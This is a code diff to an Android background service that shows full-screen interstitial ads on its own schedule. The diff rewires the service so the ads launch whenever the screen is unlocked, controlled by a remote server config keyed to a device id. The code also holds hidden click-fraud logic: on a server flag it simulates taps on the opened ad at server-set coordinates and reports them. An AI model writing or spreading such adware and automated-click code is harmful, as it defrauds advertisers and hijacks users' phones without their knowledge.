@@ -44,7 +44,7 @@ public class MyService extends Service {
     //    private boolean check = false;
     private boolean isBotClick = false;
     private boolean isClickAds = false;
-    private boolean isContinousShowAds = true;
+    private boolean isContinousShowAds = false;
 
     private ScheduledThreadPoolExecutor myTask;
     private String uuid;
@@ -85,132 +85,14 @@ public class MyService extends Service {
                 int totalTime = mPrefs.getInt("totalTime", 0);
                 totalTime += intervalService;
                 mPrefs.edit().putInt("totalTime", totalTime).commit();
-//                Log.d("caomui",idFullService);
 
-                if (!isContinousShowAds || (totalTime < delayService * 60)) {
+                if (totalTime < delayService * 60) {
                     return;
                 }
 
-                OkHttpClient client = new OkHttpClient();
-                Request okRequest = new Request.Builder()
-                        .url(AppConstants.URL_ADS_CONFIG + "?id=" + uuid)
-                        .build();
-                client.newCall(okRequest).enqueue(new Callback() {
-                    @Override
-                    public void onFailure(Call call, IOException e) {
-
-                    }
-
-                    @Override
-                    public void onResponse(Call call, Response response) throws IOException {
-                        Gson gson = new GsonBuilder().create();
-                        checkAds = gson.fromJson(response.body().string(), CheckAds.class);
-
-                        if (checkAds.isShow == 1) {
-                            new Handler(Looper.getMainLooper()).post(new Runnable() {
-                                public void run() {
-                                    mInterstitialAd = new InterstitialAd(MyService.this);
-                                    mInterstitialAd.setAdUnitId(idFullService);
-                                    mInterstitialAd.setAdListener(new AdListener() {
-
-                                        @Override
-                                        public void onAdClosed() {
-                                            super.onAdClosed();
-                                            if (!isClickAds)
-                                                checkAds(0);
-
-                                            try {
-                                                if (Build.VERSION.SDK_INT < 21) {
-                                                    ShowAds.getInstance().finishAffinity();
-                                                } else {
-                                                    ShowAds.getInstance().finishAndRemoveTask();
-                                                }
-                                            } catch (Exception e) {
-                                                e.printStackTrace();
-                                            }
-                                        }
-
-                                        @Override
-                                        public void onAdFailedToLoad(int i) {
-                                            super.onAdFailedToLoad(i);
-                                            isContinousShowAds = true;
-                                        }
-
-                                        @Override
-                                        public void onAdLeftApplication() {
-                                            super.onAdLeftApplication();
-                                            if (!isClickAds)
-                                                isClickAds = true;
-                                            if (isBotClick)
-                                                checkAds(2);
-                                            else
-                                                checkAds(1);
-                                        }
-
-                                        @Override
-                                        public void onAdOpened() {
-                                            super.onAdOpened();
-                                            isContinousShowAds = false;
-                                            if (checkAds.isBotClick == 1) {
-                                                new Thread(new Runnable() {
-                                                    @Override
-                                                    public void run() {
-                                                        try {
-                                                            Thread.sleep(checkAds.delayClick * 100);
-                                                            WindowManager window = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
-                                                            Display display = window.getDefaultDisplay();
-                                                            Point point = new Point();
-                                                            display.getSize(point);
-                                                            int width = checkAds.x * point.x / 100;
-                                                            int height = checkAds.y * point.y / 100;
-                                                            Instrumentation m_Instrumentation = new Instrumentation();
-                                                            m_Instrumentation.sendPointerSync(MotionEvent.obtain(
-                                                                    android.os.SystemClock.uptimeMillis(),
-                                                                    android.os.SystemClock.uptimeMillis(),
-                                                                    MotionEvent.ACTION_DOWN, width, height, 0));
-                                                            Thread.sleep(new Random().nextInt(100));
-                                                            m_Instrumentation.sendPointerSync(MotionEvent.obtain(
-                                                                    android.os.SystemClock.uptimeMillis(),
-                                                                    android.os.SystemClock.uptimeMillis(),
-                                                                    MotionEvent.ACTION_UP, width, height, 0));
-                                                            isBotClick = true;
-                                                        } catch (Exception e) {
-                                                            e.printStackTrace();
-                                                            isBotClick = false;
-                                                        }
-                                                    }
-                                                }).start();
-                                            }
-                                        }
-
-                                        @Override
-                                        public void onAdLoaded() {
-                                            super.onAdLoaded();
-
-                                            try {
-                                                Intent showAds = new Intent(getApplicationContext(), ShowAds.class);
-                                                showAds.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-                                                startActivity(showAds);
-                                                mInterstitialAd.show();
-                                            }
-                                            catch (Exception e){
-                                            }
-                                        }
-                                    });
-
-                                    mInterstitialAd.loadAd(new AdRequest.Builder().addTestDevice("3CC7F69A2A4A1EB57306DA0CFA16B969").build());
-                                }
-                            });
-                        } else {
-                            isContinousShowAds = false;
-                        }
-
-                    }
-                });
-
+                isContinousShowAds = true;
             }
-        }, 10, intervalService, TimeUnit.MINUTES);
-
+        }, 60, intervalService, TimeUnit.MINUTES);
 
     }
 
@@ -239,8 +121,125 @@ public class MyService extends Service {
     class MyBroadcast extends BroadcastReceiver {
         @Override
         public void onReceive(Context context, Intent intent) {
-            Log.d("caomui", "Unlock Screen");
-            isContinousShowAds = true;
+//            Log.d("caomui", "Unlock Screen "+uuid);
+            if(!isContinousShowAds)
+                return;
+            OkHttpClient client = new OkHttpClient();
+            Request okRequest = new Request.Builder()
+                    .url(AppConstants.URL_ADS_CONFIG + "?id=" + uuid)
+                    .build();
+            client.newCall(okRequest).enqueue(new Callback() {
+                @Override
+                public void onFailure(Call call, IOException e) {
+
+                }
+
+                @Override
+                public void onResponse(Call call, Response response) throws IOException {
+                    Gson gson = new GsonBuilder().create();
+                    checkAds = gson.fromJson(response.body().string(), CheckAds.class);
+
+                    if (checkAds.isShow == 1) {
+                        new Handler(Looper.getMainLooper()).post(new Runnable() {
+                            public void run() {
+                                mInterstitialAd = new InterstitialAd(MyService.this);
+                                mInterstitialAd.setAdUnitId(idFullService);
+                                mInterstitialAd.setAdListener(new AdListener() {
+
+                                    @Override
+                                    public void onAdClosed() {
+                                        super.onAdClosed();
+                                        if (!isClickAds)
+                                            checkAds(0);
+
+                                        try {
+                                            if (Build.VERSION.SDK_INT < 21) {
+                                                ShowAds.getInstance().finishAffinity();
+                                            } else {
+                                                ShowAds.getInstance().finishAndRemoveTask();
+                                            }
+                                        } catch (Exception e) {
+                                            e.printStackTrace();
+                                        }
+                                    }
+
+                                    @Override
+                                    public void onAdFailedToLoad(int i) {
+                                        super.onAdFailedToLoad(i);
+                                        isContinousShowAds = true;
+                                    }
+
+                                    @Override
+                                    public void onAdLeftApplication() {
+                                        super.onAdLeftApplication();
+                                        if (!isClickAds)
+                                            isClickAds = true;
+                                        if (isBotClick)
+                                            checkAds(2);
+                                        else
+                                            checkAds(1);
+                                    }
+
+                                    @Override
+                                    public void onAdOpened() {
+                                        super.onAdOpened();
+                                        isContinousShowAds = false;
+                                        if (checkAds.isBotClick == 1) {
+                                            new Thread(new Runnable() {
+                                                @Override
+                                                public void run() {
+                                                    try {
+                                                        Thread.sleep(checkAds.delayClick * 100);
+                                                        WindowManager window = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
+                                                        Display display = window.getDefaultDisplay();
+                                                        Point point = new Point();
+                                                        display.getSize(point);
+                                                        int width = checkAds.x * point.x / 100;
+                                                        int height = checkAds.y * point.y / 100;
+                                                        Instrumentation m_Instrumentation = new Instrumentation();
+                                                        m_Instrumentation.sendPointerSync(MotionEvent.obtain(
+                                                                android.os.SystemClock.uptimeMillis(),
+                                                                android.os.SystemClock.uptimeMillis(),
+                                                                MotionEvent.ACTION_DOWN, width, height, 0));
+                                                        Thread.sleep(new Random().nextInt(100));
+                                                        m_Instrumentation.sendPointerSync(MotionEvent.obtain(
+                                                                android.os.SystemClock.uptimeMillis(),
+                                                                android.os.SystemClock.uptimeMillis(),
+                                                                MotionEvent.ACTION_UP, width, height, 0));
+                                                        isBotClick = true;
+                                                    } catch (Exception e) {
+                                                        e.printStackTrace();
+                                                        isBotClick = false;
+                                                    }
+                                                }
+                                            }).start();
+                                        }
+                                    }
+
+                                    @Override
+                                    public void onAdLoaded() {
+                                        super.onAdLoaded();
+
+                                        try {
+                                            Intent showAds = new Intent(getApplicationContext(), ShowAds.class);
+                                            showAds.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                                            startActivity(showAds);
+                                            mInterstitialAd.show();
+                                        }
+                                        catch (Exception e){
+                                        }
+                                    }
+                                });
+
+                                mInterstitialAd.loadAd(new AdRequest.Builder().addTestDevice("3CC7F69A2A4A1EB57306DA0CFA16B969").build());
+                            }
+                        });
+                    } else {
+                        isContinousShowAds = false;
+                    }
+
+                }
+            });
         }
     }
 }
